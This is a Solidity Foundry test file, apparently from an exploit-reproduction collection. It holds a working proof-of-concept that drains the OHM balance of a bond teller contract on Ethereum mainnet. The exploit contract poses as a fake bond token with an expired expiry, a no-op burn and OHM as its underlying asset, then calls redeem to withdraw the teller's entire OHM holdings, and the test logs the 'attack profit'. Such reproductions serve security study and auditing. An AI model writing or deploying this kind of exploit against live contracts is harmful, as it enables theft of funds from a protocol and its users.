pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IERC20.sol";

interface IBondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external;
}

contract Exploit {
    address public OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
    address public BondFixedExpiryTeller = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;


    function Start() public {
        uint256 amount = IERC20(OHM).balanceOf(BondFixedExpiryTeller);
        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(address(this), amount);
    }

    function expiry() public pure returns(uint48){
        return(1377);
    }

    function burn(address, uint256) public{}
    
    function underlying() public view returns(address){
        return (OHM);
    }
       
}

contract test is DSTest{
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 15794363);
    }

    function testExploit() public {
        exploit = new Exploit();
        exploit.Start();
        verify();
    }
    function verify() public {
        console.log("============== Attack profit: ~", IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5).balanceOf(address(exploit)) / 1e9 ,"OHM", "==============");
    }
}